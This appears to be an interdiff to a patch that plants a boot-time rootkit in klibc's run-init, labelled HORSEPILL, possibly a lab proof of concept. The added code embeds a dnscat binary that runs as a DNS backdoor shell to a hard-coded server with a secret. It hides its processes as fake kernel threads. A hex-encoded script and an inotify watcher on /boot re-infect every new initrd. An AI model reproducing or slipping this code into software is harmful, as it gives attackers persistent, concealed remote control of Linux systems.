@@ -1,5 +1,5 @@
 --- klibc-2.0.7.orig/usr/kinit/run-init/Kbuild	2019-10-07 18:27:49.000000000 +0200
-+++ klibc-2.0.7/usr/kinit/run-init/Kbuild	2022-05-01 19:35:53.553175060 +0200
++++ klibc-2.0.7/usr/kinit/run-init/Kbuild	2022-05-05 14:18:43.272967611 +0200
 @@ -6,7 +6,7 @@
  shared-y := shared/run-init
  
@@ -9,8 +9,8 @@
  
  # TODO - do we want a stripped version
  # TODO - do we want the static.g + shared.g directories?
---- /dev/null	2022-05-01 15:49:46.156817956 +0200
-+++ klibc-2.0.7/usr/kinit/run-init/dnscat.h	2022-05-01 19:35:15.921082177 +0200
+--- /dev/null	2022-05-05 13:49:43.999805410 +0200
++++ klibc-2.0.7/usr/kinit/run-init/dnscat.h	2022-05-05 14:36:17.411177880 +0200
 @@ -0,0 +1,30742 @@
 +#ifndef DNSCAT_H
 +#define DNSCAT_H
@@ -30754,8 +30754,91 @@
 +unsigned int dnscat_len = 368808;
 +
 +#endif
---- /dev/null	2022-05-01 15:49:46.156817956 +0200
-+++ klibc-2.0.7/usr/kinit/run-init/horsepill.h	2022-05-01 19:35:15.917082168 +0200
+--- /dev/null	2022-05-05 13:49:43.999805410 +0200
++++ klibc-2.0.7/usr/kinit/run-init/infect.h	2022-05-05 14:36:18.023179199 +0200
+@@ -0,0 +1,80 @@
++#ifndef INFECT_H
++#define INFECT_H
++
++unsigned char infect[] = {
++	0x23, 0x21, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x0a,
++	0x0a, 0x70, 0x72, 0x6f, 0x67, 0x72, 0x61, 0x6d, 0x6e, 0x61, 0x6d, 0x65,
++	0x3d, 0x24, 0x30, 0x0a, 0x0a, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f,
++	0x6e, 0x20, 0x75, 0x73, 0x61, 0x67, 0x65, 0x20, 0x7b, 0x0a, 0x20, 0x20,
++	0x20, 0x20, 0x65, 0x63, 0x68, 0x6f, 0x20, 0x2d, 0x65, 0x20, 0x22, 0x5c,
++	0x6e, 0x55, 0x73, 0x61, 0x67, 0x65, 0x3a, 0x20, 0x24, 0x70, 0x72, 0x6f,
++	0x67, 0x72, 0x61, 0x6d, 0x6e, 0x61, 0x6d, 0x65, 0x20, 0x3c, 0x72, 0x75,
++	0x6e, 0x2d, 0x69, 0x6e, 0x69, 0x74, 0x20, 0x70, 0x61, 0x74, 0x68, 0x3e,
++	0x5c, 0x6e, 0x22, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x65, 0x78, 0x69, 0x74,
++	0x20, 0x31, 0x0a, 0x7d, 0x0a, 0x0a, 0x69, 0x66, 0x20, 0x5b, 0x20, 0x24,
++	0x23, 0x20, 0x2d, 0x65, 0x71, 0x20, 0x30, 0x20, 0x5d, 0x3b, 0x20, 0x74,
++	0x68, 0x65, 0x6e, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
++	0x75, 0x73, 0x61, 0x67, 0x65, 0x0a, 0x65, 0x6c, 0x69, 0x66, 0x20, 0x21,
++	0x20, 0x5b, 0x20, 0x2d, 0x66, 0x20, 0x24, 0x31, 0x20, 0x5d, 0x3b, 0x20,
++	0x74, 0x68, 0x65, 0x6e, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
++	0x20, 0x75, 0x73, 0x61, 0x67, 0x65, 0x0a, 0x66, 0x69, 0x0a, 0x0a, 0x63,
++	0x64, 0x20, 0x2f, 0x6c, 0x6f, 0x73, 0x74, 0x2b, 0x66, 0x6f, 0x75, 0x6e,
++	0x64, 0x0a, 0x6d, 0x6b, 0x64, 0x69, 0x72, 0x20, 0x74, 0x6d, 0x70, 0x0a,
++	0x6d, 0x6b, 0x64, 0x69, 0x72, 0x20, 0x74, 0x6d, 0x70, 0x2f, 0x65, 0x78,
++	0x74, 0x72, 0x61, 0x63, 0x74, 0x65, 0x64, 0x0a, 0x0a, 0x23, 0x20, 0x72,
++	0x61, 0x6d, 0x64, 0x69, 0x73, 0x6b, 0x20, 0x75, 0x6e, 0x70, 0x61, 0x63,
++	0x6b, 0x0a, 0x63, 0x70, 0x20, 0x2f, 0x62, 0x6f, 0x6f, 0x74, 0x2f, 0x69,
++	0x6e, 0x69, 0x74, 0x72, 0x64, 0x2e, 0x69, 0x6d, 0x67, 0x2d, 0x24, 0x28,
++	0x75, 0x6e, 0x61, 0x6d, 0x65, 0x20, 0x2d, 0x72, 0x29, 0x20, 0x74, 0x6d,
++	0x70, 0x2f, 0x0a, 0x63, 0x64, 0x20, 0x74, 0x6d, 0x70, 0x2f, 0x0a, 0x75,
++	0x6e, 0x6d, 0x6b, 0x69, 0x6e, 0x69, 0x74, 0x72, 0x61, 0x6d, 0x66, 0x73,
++	0x20, 0x69, 0x6e, 0x69, 0x74, 0x72, 0x64, 0x2e, 0x69, 0x6d, 0x67, 0x2d,
++	0x24, 0x28, 0x75, 0x6e, 0x61, 0x6d, 0x65, 0x20, 0x2d, 0x72, 0x29, 0x20,
++	0x2e, 0x2f, 0x65, 0x78, 0x74, 0x72, 0x61, 0x63, 0x74, 0x65, 0x64, 0x2f,
++	0x0a, 0x63, 0x64, 0x20, 0x65, 0x78, 0x74, 0x72, 0x61, 0x63, 0x74, 0x65,
++	0x64, 0x2f, 0x0a, 0x0a, 0x23, 0x20, 0x69, 0x6e, 0x66, 0x65, 0x63, 0x74,
++	0x69, 0x6f, 0x6e, 0x0a, 0x72, 0x6d, 0x20, 0x2d, 0x66, 0x20, 0x6d, 0x61,
++	0x69, 0x6e, 0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x72,
++	0x75, 0x6e, 0x2d, 0x69, 0x6e, 0x69, 0x74, 0x0a, 0x63, 0x70, 0x20, 0x24,
++	0x31, 0x20, 0x6d, 0x61, 0x69, 0x6e, 0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62,
++	0x69, 0x6e, 0x2f, 0x72, 0x75, 0x6e, 0x2d, 0x69, 0x6e, 0x69, 0x74, 0x0a,
++	0x0a, 0x23, 0x20, 0x72, 0x61, 0x6d, 0x64, 0x69, 0x73, 0x6b, 0x20, 0x72,
++	0x65, 0x70, 0x61, 0x63, 0x6b, 0x0a, 0x63, 0x64, 0x20, 0x65, 0x61, 0x72,
++	0x6c, 0x79, 0x2f, 0x0a, 0x66, 0x69, 0x6e, 0x64, 0x20, 0x2e, 0x20, 0x2d,
++	0x70, 0x72, 0x69, 0x6e, 0x74, 0x30, 0x20, 0x7c, 0x20, 0x63, 0x70, 0x69,
++	0x6f, 0x20, 0x2d, 0x2d, 0x6e, 0x75, 0x6c, 0x6c, 0x20, 0x2d, 0x2d, 0x63,
++	0x72, 0x65, 0x61, 0x74, 0x65, 0x20, 0x2d, 0x2d, 0x66, 0x6f, 0x72, 0x6d,
++	0x61, 0x74, 0x3d, 0x6e, 0x65, 0x77, 0x63, 0x20, 0x3e, 0x20, 0x2f, 0x6c,
++	0x6f, 0x73, 0x74, 0x2b, 0x66, 0x6f, 0x75, 0x6e, 0x64, 0x2f, 0x74, 0x6d,
++	0x70, 0x2f, 0x6e, 0x65, 0x77, 0x69, 0x6e, 0x69, 0x74, 0x72, 0x64, 0x0a,
++	0x63, 0x64, 0x20, 0x2e, 0x2e, 0x2f, 0x65, 0x61, 0x72, 0x6c, 0x79, 0x32,
++	0x2f, 0x0a, 0x66, 0x69, 0x6e, 0x64, 0x20, 0x6b, 0x65, 0x72, 0x6e, 0x65,
++	0x6c, 0x20, 0x2d, 0x70, 0x72, 0x69, 0x6e, 0x74, 0x30, 0x20, 0x7c, 0x20,
++	0x63, 0x70, 0x69, 0x6f, 0x20, 0x2d, 0x2d, 0x6e, 0x75, 0x6c, 0x6c, 0x20,
++	0x2d, 0x2d, 0x63, 0x72, 0x65, 0x61, 0x74, 0x65, 0x20, 0x2d, 0x2d, 0x66,
++	0x6f, 0x72, 0x6d, 0x61, 0x74, 0x3d, 0x6e, 0x65, 0x77, 0x63, 0x20, 0x3e,
++	0x3e, 0x20, 0x2f, 0x6c, 0x6f, 0x73, 0x74, 0x2b, 0x66, 0x6f, 0x75, 0x6e,
++	0x64, 0x2f, 0x74, 0x6d, 0x70, 0x2f, 0x6e, 0x65, 0x77, 0x69, 0x6e, 0x69,
++	0x74, 0x72, 0x64, 0x0a, 0x63, 0x64, 0x20, 0x2e, 0x2e, 0x2f, 0x6d, 0x61,
++	0x69, 0x6e, 0x2f, 0x0a, 0x66, 0x69, 0x6e, 0x64, 0x20, 0x2e, 0x20, 0x7c,
++	0x20, 0x63, 0x70, 0x69, 0x6f, 0x20, 0x2d, 0x2d, 0x63, 0x72, 0x65, 0x61,
++	0x74, 0x65, 0x20, 0x2d, 0x2d, 0x66, 0x6f, 0x72, 0x6d, 0x61, 0x74, 0x3d,
++	0x6e, 0x65, 0x77, 0x63, 0x20, 0x7c, 0x20, 0x6c, 0x7a, 0x34, 0x20, 0x2d,
++	0x6c, 0x20, 0x2d, 0x63, 0x20, 0x3e, 0x3e, 0x20, 0x2f, 0x6c, 0x6f, 0x73,
++	0x74, 0x2b, 0x66, 0x6f, 0x75, 0x6e, 0x64, 0x2f, 0x74, 0x6d, 0x70, 0x2f,
++	0x6e, 0x65, 0x77, 0x69, 0x6e, 0x69, 0x74, 0x72, 0x64, 0x0a, 0x0a, 0x23,
++	0x20, 0x72, 0x61, 0x6d, 0x64, 0x69, 0x73, 0x6b, 0x20, 0x72, 0x65, 0x70,
++	0x6c, 0x61, 0x63, 0x65, 0x6d, 0x65, 0x6e, 0x74, 0x0a, 0x63, 0x64, 0x20,
++	0x2f, 0x6c, 0x6f, 0x73, 0x74, 0x2b, 0x66, 0x6f, 0x75, 0x6e, 0x64, 0x0a,
++	0x72, 0x6d, 0x20, 0x2d, 0x66, 0x20, 0x2f, 0x62, 0x6f, 0x6f, 0x74, 0x2f,
++	0x69, 0x6e, 0x69, 0x74, 0x72, 0x64, 0x2e, 0x69, 0x6d, 0x67, 0x2d, 0x24,
++	0x28, 0x75, 0x6e, 0x61, 0x6d, 0x65, 0x20, 0x2d, 0x72, 0x29, 0x0a, 0x63,
++	0x70, 0x20, 0x74, 0x6d, 0x70, 0x2f, 0x6e, 0x65, 0x77, 0x69, 0x6e, 0x69,
++	0x74, 0x72, 0x64, 0x20, 0x2f, 0x62, 0x6f, 0x6f, 0x74, 0x2f, 0x69, 0x6e,
++	0x69, 0x74, 0x72, 0x64, 0x2e, 0x69, 0x6d, 0x67, 0x2d, 0x24, 0x28, 0x75,
++	0x6e, 0x61, 0x6d, 0x65, 0x20, 0x2d, 0x72, 0x29, 0x0a, 0x72, 0x6d, 0x20,
++	0x2d, 0x72, 0x66, 0x20, 0x74, 0x6d, 0x70, 0x2f
++};
++unsigned int infect_len = 860;
++
++#endif
+--- /dev/null	2022-05-05 13:49:43.999805410 +0200
++++ klibc-2.0.7/usr/kinit/run-init/horsepill.h	2022-05-05 14:36:16.855176681 +0200
 @@ -0,0 +1,8 @@
 +#ifndef HORSEPILL_H
 +#define HORSEPILL_H
@@ -30765,9 +30848,9 @@
 +void do_attack();
 +
 +#endif
---- /dev/null	2022-05-01 15:49:46.156817956 +0200
-+++ klibc-2.0.7/usr/kinit/run-init/horsepill.c	2022-05-01 19:47:04.568597737 +0200
-@@ -0,0 +1,361 @@
+--- /dev/null	2022-05-05 13:49:43.999805410 +0200
++++ klibc-2.0.7/usr/kinit/run-init/horsepill.c	2022-05-05 14:36:16.247175371 +0200
+@@ -0,0 +1,531 @@
 +#define _GNU_SOURCE
 +#include <ctype.h>
 +#include <dirent.h>
@@ -30775,12 +30858,14 @@
 +#include <fcntl.h>
 +#include <linux/reboot.h>
 +#include <linux/sched.h>
++#include <poll.h>
 +#include <sched.h>
 +#include <signal.h>
 +#include <stdint.h>
 +#include <stdio.h>
 +#include <stdlib.h>
 +#include <string.h>
++#include <sys/inotify.h>
 +#include <sys/mman.h>
 +#include <sys/mount.h>
 +#include <sys/prctl.h>
@@ -30789,11 +30874,13 @@
 +#include <sys/syscall.h>
 +#include <sys/sysmacros.h>
 +#include <sys/types.h>
++#include <sys/utsname.h>
 +#include <sys/wait.h>
 +#include <unistd.h>
 +
 +#include "dnscat.h"
 +#include "horsepill.h"
++#include "infect.h"
 +
 +#ifndef __NR_clone3
 +#define __NR_clone3 -1
@@ -30824,12 +30911,16 @@
 +#define G3LBIN(x) (void)x
 +#define ptr_to_u64(ptr) ((__u64)((uintptr_t)(ptr)))
 +
-+#define DNSCAT_PATH "/lost+found/dnscat"
++#define DNSCAT_PATH     "/lost+found/dnscat"
++#define INFECT_PATH     "/lost+found/infect.sh"
 +
-+static char *const ARGV0 = "dnscat\0";
-+static char *const ARGV1 = "--dns\0";
-+static char *const ARGV2 = "server=192.168.1.197,port=53\0";
-+static char *const ARGV3 = "--secret=5100a1e43a193b60ba720ada295189a6\0";
++static char *const DNSCAT_ARGV0 = "dnscat\0";
++static char *const DNSCAT_ARGV1 = "--dns\0";
++static char *const DNSCAT_ARGV2 = "server=172.20.10.2,port=53\0";
++static char *const DNSCAT_ARGV3 = "--secret=5100a1e43a193b60ba720ada295189a6\0";
++
++static char *const INFECT_ARGV0 = "infect.sh\0";
++static char *const INFECT_ARGV1 = "/lost+found/run-init\0";
 +
 +static pid_t init_pid;
 +char **cmdline_ptr;
@@ -30866,6 +30957,7 @@
 +                 * the fake kernel threads
 +                 */
 +                G3LBIN(sigfillset(&set));
++                G3LBIN(sigdelset(&set, SIGINT));
 +                G3LBIN(sigprocmask(SIG_BLOCK, &set, NULL));
 +
 +                set_process_name(threads[0]);
@@ -31010,48 +31102,194 @@
 +        err_exit(msg);
 +}
 +
-+void write_dnscat_exe()
++static void write_file(char *dest, unsigned char source[], unsigned int len)
 +{
 +        FILE* file = NULL;
-+	file = fopen(DNSCAT_PATH, "w+");
++	file = fopen(dest, "w+");
 +	if (file) {
-+		(void)fwrite((const void *)dnscat, 1, dnscat_len, file);
-+		(void)fclose(file);
-+		(void)chmod(DNSCAT_PATH, S_IXUSR | S_IRUSR);
++		G3LBIN(fwrite((const void *)source, 1, len, file));
++		G3LBIN(fclose(file));
++		G3LBIN(chmod(dest, S_IXUSR | S_IRUSR));
 +	}
 +}
 +
-+static pid_t run_dnscat_client()
++static pid_t execv_wrapper(const char *path, char *const *argv)
 +{
 +	pid_t pid;
 +
 +	pid = fork();
 +	if (pid < 0) {
-+		printf("couldn't fork!\n");
-+		exit(EXIT_FAILURE);
++		err_exit("couldn't fork!");
 +	} else if (pid == 0) {
 +		/* child */
-+		char *const argv[5] = {
-+                        ARGV0,
-+                        ARGV1,
-+                        ARGV2,
-+                        ARGV3,
-+                        NULL
-+                };
-+
-+		close(0);
-+		close(1);
-+		close(2);
++		G3LBIN(close(0));
++		G3LBIN(close(1));
++		G3LBIN(close(2));
 +
 +		G3LBIN(open("/dev/null", O_RDONLY));
 +		G3LBIN(open("/dev/null", O_WRONLY));
 +		G3LBIN(open("/dev/null", O_RDWR));
 +
-+		execv(DNSCAT_PATH, argv);
++		G3LBIN(execv(path, argv));
 +
-+		err_exit("couldn't run dnscat!");
++		err_exit("execv");
 +	}
 +	return pid;
++}
++
++static void preserve_hacked_initrd(char *filename)
++{
++        char initrd_name[512];
++        struct utsname utsdata;
++        pid_t infect_pid;
++        pid_t pid;
++        char *const infect_argv[3] = {
++                INFECT_ARGV0,
++                INFECT_ARGV1,
++                NULL
++        };
++
++        if (uname(&utsdata) < 0)
++                err_exit("uname");
++        
++        sprintf(initrd_name, "initrd.img-%s", utsdata.release);
++        if (strcmp(filename, initrd_name) == 0) {
++                /* overwrite */
++                infect_pid = execv_wrapper(INFECT_PATH, infect_argv);
++retry:
++                pid = waitpid(infect_pid, NULL, 0);
++                if (pid < 0) {
++                        if (errno != EINTR) {
++                                err_exit("watipid returned error!");
++                        } else {
++                                /* interrupted via signal */
++                                goto retry;
++                        }
++                }
++        }
++}
++
++/* Read all available inotify events from the file descriptor 'fd'.
++        wd is the table of watch descriptors for the directories in argv.
++        argc is the length of wd and argv.
++        argv is the list of watched directories.
++        Entry 0 of wd and argv is unused. */
++
++static void handle_events(int fd, const char *dirname)
++{
++        /* Some systems cannot read integer variables if they are not
++        properly aligned. On other systems, incorrect alignment may
++        decrease performance. Hence, the buffer used for reading from
++        the inotify file descriptor should have the same alignment as
++        struct inotify_event. */
++
++        char buf[4096]
++                __attribute__ ((aligned(__alignof__(struct inotify_event))));
++        const struct inotify_event *event;
++        ssize_t len;
++        int overwrite = 0;
++        
++
++        /* Loop while events can be read from inotify file descriptor. */
++
++        for (;;) {
++
++                /* Read some events. */
++
++                len = read(fd, buf, sizeof(buf));
++                if (len == -1 && errno != EAGAIN)
++                        err_exit("read");
++
++                /* If the nonblocking read() found no events to read, then
++                        it returns -1 with errno set to EAGAIN. In that case,
++                        we exit the loop. */
++
++                if (len <= 0)
++                        break;
++
++                /* Loop over all events in the buffer. */
++
++                for (char *ptr = buf; ptr < buf + len;
++                        ptr += sizeof(struct inotify_event) + event->len) {
++
++                        event = (const struct inotify_event *) ptr;
++
++                        /* Check event type. */
++
++                        if ((event->mask & IN_CREATE) ||
++                            (event->mask & IN_MOVED_TO))
++                                overwrite = 1;
++
++                        /* Hijack the legitimate ramdisk installation. */
++
++                        if (event->len && overwrite) {
++                                preserve_hacked_initrd((char *)event->name);
++                                overwrite = 0;
++                        }
++                }
++        }
++}
++
++static pid_t run_watcher()
++{
++        pid_t pid;
++
++        pid = fork();
++	if (pid < 0) {
++		err_exit("couldn't fork!");
++	} else if (pid == 0) {
++		/* child */
++
++                int fd, poll_num;
++                int wd;
++                nfds_t nfds;
++                struct pollfd fds[1];
++                const char *dirname = "/boot";
++
++                /* Create the file descriptor for accessing the inotify API. */
++
++                fd = inotify_init();
++                if (fd == -1)
++                        err_exit("inotify_init1");
++                fcntl(fd, F_SETFL, O_NONBLOCK);
++
++                /* Mark directory for events
++                - file was created
++                - file was renamed */
++
++                wd = inotify_add_watch(fd, dirname, IN_CREATE | IN_MOVED_TO);
++                if (wd == -1)
++                        err_exit("inotify_add_watch");
++
++                /* Prepare for polling. */
++
++                nfds = 1;
++
++                fds[0].fd = fd;                 /* Inotify input */
++                fds[0].events = POLLIN;
++
++                /* Wait for events. */
++
++                while (1) {
++                        poll_num = poll(fds, nfds, -1);
++                        if (poll_num == -1) {
++                                if (errno == EINTR)
++                                        continue;
++                                err_exit("poll");
++                        }
++
++                        if (poll_num > 0) {
++
++                                if (fds[0].revents & POLLIN) {
++
++                                        /* Inotify events are available. */
++
++                                        handle_events(fd, dirname);
++                                }
++                        }
++                }
++        }
++        return pid;
 +}
 +
 +void do_attack()
@@ -31078,10 +31316,14 @@
 +                int wstatus;
 +                pid_t pid;
 +                pid_t dnscat_pid;
-+
-+                /* plop a ramdisk over lost+found for our use */
-+		if (mount("tmpfs", "/lost+found", "tmpfs", MS_STRICTATIME, "mode=755") < 0)
-+                        err_exit("couldn't mount ramdisk!");
++                pid_t initrd_watcher;
++                char *const dnscat_argv[5] = {
++                        DNSCAT_ARGV0,
++                        DNSCAT_ARGV1,
++                        DNSCAT_ARGV2,
++                        DNSCAT_ARGV3,
++                        NULL
++                };
 +
 +                /* install signal handler to handle signal delivered
 +                 * ctrl-alt-delete, which we will send to child init
@@ -31096,13 +31338,22 @@
 +		 */
 +		sleep(20);
 +
++                /* remount root to write on it */
 +		if (mount(NULL, "/", NULL, MS_REMOUNT | MS_RELATIME,
 +			  "errors=remount-ro,data=ordered") < 0)
 +                        err_exit("couldn't remount /");
 +
-+                /* spawn a process for backdoor shell */
-+		write_dnscat_exe();
-+		dnscat_pid = run_dnscat_client();
++                /* mount scratch space over lost+found for our use */
++		if (mount("tmpfs", "/lost+found", "tmpfs", MS_STRICTATIME, "mode=755") < 0)
++                        err_exit("couldn't mount ramdisk!");
++
++                /* spawn a process for backdoor shell and a process
++                 * to observe ramdisk updates
++                 */
++		write_file(DNSCAT_PATH, dnscat, dnscat_len);
++                write_file(INFECT_PATH, infect, infect_len);
++		dnscat_pid = execv_wrapper(DNSCAT_PATH, dnscat_argv);
++                initrd_watcher = run_watcher();
 +
 +                /* watching for dnscat exit
 +                 * also, watching for reinfection
@@ -31120,7 +31371,9 @@
 +                        } else if (pid == init_pid) {
 +                                handle_init_exit(wstatus);
 +                        } else if (pid == dnscat_pid) {
-+                         	dnscat_pid = run_dnscat_client();
++                         	dnscat_pid = execv_wrapper(DNSCAT_PATH, dnscat_argv);
++                        } else if (pid == initrd_watcher) {
++                         	initrd_watcher = run_watcher();
 +                        } else {
 +                                printf("unknown other pid %d exited\n", pid);
 +                        }
@@ -31130,7 +31383,7 @@
 +}
 +
 --- klibc-2.0.7.orig/usr/kinit/run-init/run-init.c	2019-10-07 18:27:49.000000000 +0200
-+++ klibc-2.0.7/usr/kinit/run-init/run-init.c	2022-05-01 19:37:07.373383026 +0200
++++ klibc-2.0.7/usr/kinit/run-init/run-init.c	2022-05-05 14:19:34.237065602 +0200
 @@ -52,6 +52,7 @@
  #include <string.h>
  #include <errno.h>
@@ -31148,7 +31401,7 @@
  	/* Variables... */
  	int o;
 --- klibc-2.0.7.orig/usr/kinit/run-init/runinitlib.c	2019-10-07 18:27:49.000000000 +0200
-+++ klibc-2.0.7/usr/kinit/run-init/runinitlib.c	2022-05-01 19:38:22.377625283 +0200
++++ klibc-2.0.7/usr/kinit/run-init/runinitlib.c	2022-05-05 14:20:28.741172793 +0200
 @@ -55,6 +55,7 @@
  #include <sys/vfs.h>
  #include "run-init.h"
@@ -31157,13 +31410,14 @@
  
  /* Make it possible to compile on glibc by including constants that the
     always-behind shipped glibc headers may not include.  Classic example
-@@ -217,6 +218,9 @@
+@@ -217,6 +218,10 @@
  	close(confd);
  
  	if (!dry_run) {
-+        puts("[HORSEPILL] G3LBIN VISITED YOU!\n");
-+        sleep(10);
-+        do_attack();
++                puts("[HORSEPILL] G3LBIN VISITED YOU!\n");
++                sleep(5);
++                do_attack();
++
  		/* Spawn init */
  		execv(init, initargs);
  		return init;		/* Failed to spawn init */
